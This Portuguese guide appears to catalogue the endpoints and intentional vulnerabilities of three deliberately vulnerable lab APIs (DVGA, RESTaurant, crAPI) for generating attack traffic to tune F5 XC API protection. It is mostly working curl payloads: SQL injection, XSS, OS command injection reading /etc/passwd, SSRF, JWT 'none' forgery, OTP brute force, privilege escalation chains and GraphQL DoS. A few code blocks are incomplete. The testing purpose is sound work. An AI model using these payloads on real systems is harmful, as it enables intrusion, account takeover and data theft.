## Visão Geral

Este guia cataloga cada endpoint de API, vulnerabilidade intencional e payload de ataque nas três aplicações de teste de segurança de API. Utilize-o para construir padrões de geração de tráfego para o desenvolvimento de perfis de proteção de API no F5 XC.

| Aplicação | Protocolo | Caminho | Porta | Autenticação | Vulnerabilidades |
|---|---|---|---|---|---|
| **DVGA** | GraphQL | `/dvga/` | 80 | Nenhuma (admin: admin/password) | 25 cenários |
| **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (form-encoded) | 7 categorias OWASP API 2023 |
| **crAPI** | REST (microsserviços) | `/` | 8888 | JWT (Bearer) | 18+ desafios |

### Variáveis de Ambiente

```bash
ORIGIN="http://<ORIGIN_IP>"
CRAPI="http://<ORIGIN_IP>:8888"
```

## DVGA (Damn Vulnerable GraphQL Application)

**Endpoint GraphQL:** `POST ${ORIGIN}/dvga/graphql`
**IDE GraphiQL:** `GET ${ORIGIN}/dvga/`
**Credenciais de Admin:** admin / password

Todas as interações com o DVGA utilizam um único endpoint (`/dvga/graphql`) com requisições POST contendo payloads JSON `{"query":"..."}`.

### Visão Geral do Schema

```
Queries:  pastes, paste, me, systemHealth, systemUpdate, systemDiagnostics
Mutations: createPaste, importPaste, uploadPaste
Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
          OwnerObject (id, username, pastes)  ← referência circular
```

### Referência de Endpoints

| Operação | Tipo | Autenticação | Finalidade |
|---|---|---|---|
| `pastes(public, filter, limit)` | Query | Não | Listar pastes (injeção SQL via filter) |
| `paste(id)` | Query | Não | Obter paste individual |
| `me(token)` | Query | Não | Obter usuário por JWT (vulnerável a falsificação) |
| `systemHealth` | Query | Não | Verificação de saúde |
| `systemUpdate` | Query | Não | Query lenta (~82s, vetor de DoS) |
| `systemDiagnostics(cmd)` | Query | admin/password | Executar comandos OS da whitelist |
| `createPaste(title, content, public)` | Mutation | Não | Criar paste (XSS via content) |
| `importPaste(host, port, path, scheme)` | Mutation | Não | Importar paste remoto (SSRF, injeção de comando) |
| `uploadPaste(filename, content)` | Mutation | Não | Upload de paste (travessia de diretório) |

### Catálogo de Vulnerabilidades

#### 1. Negação de Serviço (6 cenários)

**Ataque de Query em Lote:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"}]'
```

**Recursão Profunda (referências circulares Owner/Paste):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}}}"}'
```

**Query Intensiva em Recursos (resposta de ~82 segundos):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemUpdate}"}'
```

**Duplicação de Campos (repetir campo 500+ vezes):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}'
```

**Ataque Baseado em Alias (1000 operações com alias):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{q0:systemUpdate q1:systemUpdate q2:systemUpdate q3:systemUpdate q4:systemUpdate q5:systemUpdate q6:systemUpdate q7:systemUpdate q8:systemUpdate q9:systemUpdate}"}'
```

#### 2. Divulgação de Informações (5 cenários)

**Introspecção (enumeração completa do schema):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
```

**Sugestões de Campos (erro de digitação revela campos válidos):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{titl}}"}'
```

**SSRF via importPaste (sondar serviços internos):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:57575,path:\"/\",scheme:\"http\"){result}}"}'
```

#### 3. Injeção (4 cenários)

**Injeção SQL via parâmetro filter:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes(filter:\"aaa\\u0027 OR 1=1--\"){id title content public}}"}'
```

**XSS Armazenado via createPaste:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{createPaste(title:\"<img src=x onerror=alert(1)>\",content:\"xss\",public:true){paste{id title}}}"}'
```

**Injeção de Log (falsificação do nome da operação):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation getPaste{createPaste(title:\"injected\",content:\"hidden mutation\",public:true){paste{id}}}"}'
```

#### 4. Execução de Código (3 cenários)

**Injeção de Comando OS via importPaste:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:80,path:\"/ ; uname -a\",scheme:\"http\"){result}}"}'
```

**Comando OS via systemDiagnostics (requer autenticação admin):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemDiagnostics(cmd:\"id\")}"}'
```

#### 5. Bypass de Autorização (3 cenários)

**Falsificação de Token JWT (aceita tokens não assinados):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{me(token:\"eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.\"){username}}"}'
```

**Escrita Arbitrária de Arquivo via uploadPaste (travessia de diretório):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{uploadPaste(filename:\"../../../tmp/test.txt\",content:\"path traversal test\"){result}}"}'
```

## RESTaurant API (Damn Vulnerable RESTaurant)

**Swagger UI:** `${ORIGIN}/restaurant/docs`
**Especificação OpenAPI:** `${ORIGIN}/restaurant/openapi.json`
**Autenticação:** JWT via POST form-encoded para `/restaurant/token`
**Papéis:** Customer (padrão), Employee, Chef (admin)

### Configuração: Registrar e Autenticar

```bash
# Registrar um usuário de teste
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123","first_name":"Test","last_name":"User","phone_number":"5551234567"}'

# Obter token JWT (NOTA: form-encoded, não JSON)
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&password=Attack123" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Bearer token: ${TOKEN}"
```

### Catálogo de Vulnerabilidades

#### API1:2023 — Autorização Quebrada em Nível de Objeto (BOLA)

**Modificar o perfil de outro usuário:**
```bash
curl -X PUT ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","phone_number":"hacked","first_name":"Pwned","last_name":"User"}'
```

**Acessar pedidos de outros usuários (enumerar offset):**
```bash
for i in 1 2 3 4 5; do
  curl -sf ${ORIGIN}/restaurant/orders/${i} \
    -H "Authorization: Bearer ${TOKEN}" 2>&1
  echo ""
done
```

#### API2:2023 — Autenticação Quebrada

**Força bruta de segredo fraco do JWT (segredo é 6 dígitos: 97952):**
```bash
# Decodifique e falsifique tokens em jwt.io
# Segredo: 97952 (pode ser forçado com hashcat -a 3 -m 16500 token '?d?d?d?d?d?d')

# Falsificar um token de Chef:
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"chef","exp":9999999999}
# Assinar com segredo: 97952
```

#### API3:2023 — Autorização Quebrada em Nível de Propriedade de Objeto (BOPLA)

**Atribuição em massa de papel de Customer para Chef:**
```bash
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

**Caminho de escalação: Customer → Employee → Chef:**
```bash
# Passo 1: Escalar para Employee
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Employee"}'

# Passo 2: Escalar para Chef
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

#### API5:2023 — Autorização Quebrada em Nível de Função (BFLA)

**Deletar item do menu como Customer (deveria exigir Employee+):**
```bash
curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
  -H "Authorization: Bearer ${TOKEN}"
```

**Alterar o papel de outro usuário:**
```bash
curl -X PUT ${ORIGIN}/restaurant/users/update_role \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","role":"Customer"}'
```

#### API7:2023 — Falsificação de Requisição do Lado do Servidor (SSRF)

**Sondar endpoints internos via image_url do menu (requer papel Employee):**
```bash
# Primeiro escale para Employee via BOPLA, depois:
curl -X PUT ${ORIGIN}/restaurant/menu \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"SSRF Test","price":1.00,"category":"Test","image_url":"http://127.0.0.1:8091/admin/reset-chef-password"}'
```

#### API8:2023 — Injeção

**Injeção de Comando OS via estatísticas de disco (requer papel Chef):**
```bash
# Após escalar para Chef:
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;whoami" \
  -H "Authorization: Bearer ${TOKEN}"

curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;cat%20/etc/passwd" \
  -H "Authorization: Bearer ${TOKEN}"
```

### Cadeia de Ataque Completa: De Customer a Root

```bash
# 1. Registrar
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"Hack123","first_name":"H","last_name":"X","phone_number":"0"}'

# 2. Obter token
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 3. Escalar para Chef (BOPLA)
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'

# 4. Re-autenticar para obter token de nível Chef
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 5. Injeção de comando (RCE)
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
  -H "Authorization: Bearer ${TOKEN}"
```

## crAPI (OWASP Completely Ridiculous API)

**Interface Web:** `${CRAPI}/`
**MailHog:** `${CRAPI}/mailhog/` (captura de e-mail para verificação)
**Autenticação:** Token JWT Bearer (RS256, vulnerável a confusão de algoritmo)
**Arquitetura:** 7 microsserviços (identity, community, workshop, postgres, mongo, mailhog, web)

### Configuração: Registrar, Verificar E-mail, Login

```bash
# 1. Registrar
curl -X POST ${CRAPI}/identity/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"Test User","email":"tester@example.com","number":"5551234567","password":"TestPass123"}'

# 2. Verificar MailHog para e-mail de verificação
# Navegue para ${CRAPI}/mailhog/ ou use a API do MailHog:
curl -sf ${CRAPI}/mailhog/api/v2/messages | python3 -c "
import sys,json
msgs = json.load(sys.stdin)['items']
for m in msgs:
    print(f\"To: {m['Raw']['To'][0]}, Subject: {m['Content']['Headers']['Subject'][0]}\")
"

# 3. Login e obter token JWT
TOKEN=$(curl -sf -X POST ${CRAPI}/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"tester@example.com","password":"TestPass123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

echo "Bearer token: ${TOKEN}"
```

### Catálogo de Desafios

#### Desafio 1 — BOLA: Acessar Localização do Veículo de Outro Usuário

```bash
# Obtenha o UUID do seu veículo primeiro
curl -sf ${CRAPI}/identity/api/v2/vehicle/vehicles \
  -H "Authorization: Bearer ${TOKEN}"

# Acessar o veículo de outro usuário (substitua o UUID)

  -H "Authorization: Bearer ${TOKEN}"
```

#### Desafio 2 — BOLA: Acessar Relatórios de Mecânicos (Sem Autenticação)

```bash
# Enumeração de IDs sequenciais — sem necessidade de token
for i in 1 2 3 4 5; do
  echo "Report $i:"
  curl -sf "${CRAPI}/workshop/api/mechanic/mechanic_report?report_id=${i}"
  echo ""
```

#### Desafio 3 — Autenticação Quebrada: Força Bruta de OTP para Redefinição de Senha

```bash
# Solicitar OTP para a vítima
curl -X POST ${CRAPI}/identity/api/auth/forget-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# Força bruta de OTP de 4 dígitos (v2 NÃO tem limite de taxa)
for otp in $(seq -w 0000 9999); do
  RESULT=$(curl -sf -X POST ${CRAPI}/identity/api/auth/v2/check-otp \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@example.com\",\"otp\":\"${otp}\"}" 2>&1)
  echo "$otp: $RESULT" | grep -v "Invalid OTP" && break
done
```

#### Desafio 14 — Acesso a Pedidos sem Autenticação

```bash
# Sem cabeçalho Authorization — ainda retorna dados
for i in 1 2 3 4 5; do
  curl -sf ${CRAPI}/workshop/api/shop/orders/${i}
```

#### Desafio 15 — Confusão de Algoritmo JWT

```bash
# Falsifique um JWT com algoritmo "none" (sem verificação de assinatura):
# 1. Defina o header: {"alg":"none","typ":"JWT"} e codifique em base64url
# 2. Defina o payload: {"email":"admin@example.com","role":"admin"} e codifique em base64url
# 3. Junte com pontos, deixe a assinatura vazia: <header>.<payload>.
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"email":"admin@example.com","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED="${HEADER}.${PAYLOAD}."

curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
  -H "Authorization: Bearer ${FORGED}"
```

## Padrões de Geração de Tráfego

### Fase 1: Linha de Base (Caminho Feliz)

Gere tráfego legítimo para estabelecer o comportamento normal da API antes de testar padrões de ataque.

**Linha de base DVGA:**
```bash
# Queries normais
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"{pastes{id title}}"}'
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"mutation{createPaste(title:\"note\",content:\"hello\",public:true){paste{id}}}"}'
```

**Linha de base RESTaurant:**
```bash
curl -sf ${ORIGIN}/restaurant/menu -H "Authorization: Bearer ${TOKEN}"
curl -sf ${ORIGIN}/restaurant/profile -H "Authorization: Bearer ${TOKEN}"
curl -X POST ${ORIGIN}/restaurant/orders -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" -d '{"menu_item_id":1,"quantity":1}'
```

**Linha de base crAPI:**
```bash
curl -sf ${CRAPI}/identity/api/v2/user/dashboard -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/workshop/api/shop/products -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/community/api/v2/community/posts -H "Authorization: Bearer ${TOKEN}"
```

### Fase 2: Tráfego de Ataque por Categoria OWASP

**Teste de BOLA:** Enumere IDs sequenciais, troque identificadores de usuário nas requisições, acesse recursos sem propriedade.

**Teste de injeção:** Payloads SQL em parâmetros de filter/cupom, injeção de query GraphQL, injeção de comando OS via campos de parâmetro.

**Teste de bypass de autenticação:** Falsifique tokens JWT, force OTPs por força bruta, use versões depreciadas da API, confusão de algoritmo.

**Teste de SSRF:** URLs internas nos parâmetros `importPaste`, `image_url` e `mechanic_api`.

**Teste de DoS:** Ataques GraphQL por lote/recursão/alias, `repeat_request_if_failed` com contagens altas.

### Fase 3: Cadeias de Ataque com Estado

Alguns ataques requerem sequências de múltiplos passos com estado:

1. **Cadeia de escalação RESTaurant:** Registrar → Token → PATCH papel para Chef → Re-autenticar → Injeção de comando
2. **Fluxo completo crAPI:** Cadastro → Verificar e-mail (MailHog) → Login → Adicionar veículo → Contatar mecânico (SSRF) → Manipulação de pedido
3. **DVGA reconhecimento-até-exploração:** Introspecção → Descobrir systemDiagnostics → Força bruta de credenciais admin → Execução de comando OS
